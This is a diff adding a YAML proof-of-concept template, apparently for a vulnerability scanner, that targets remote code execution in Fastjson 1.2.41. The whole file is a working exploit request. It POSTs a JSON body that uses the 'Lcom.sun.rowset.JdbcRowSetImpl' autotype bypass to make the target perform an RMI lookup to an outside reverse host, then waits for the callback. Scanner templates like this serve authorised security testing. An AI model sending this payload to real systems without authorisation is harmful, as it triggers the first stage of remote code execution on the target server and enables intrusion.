@@ -1,0 +1,19 @@
+name: poc-yaml-fastjson-1.2.41-rce
+set:
+  reverse: newReverse()
+  reverseURL: reverse.domain
+rules:
+  r0:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json
+      body:  |
+        {
+           "@type":"Lcom.sun.rowset.JdbcRowSetImpl",
+           "dataSourceName":"rmi://{{reverseURL}}/Exploit",
+           "autoCommit":true
+        }
+    expression: reverse.wait(5)
+expression: r0() 
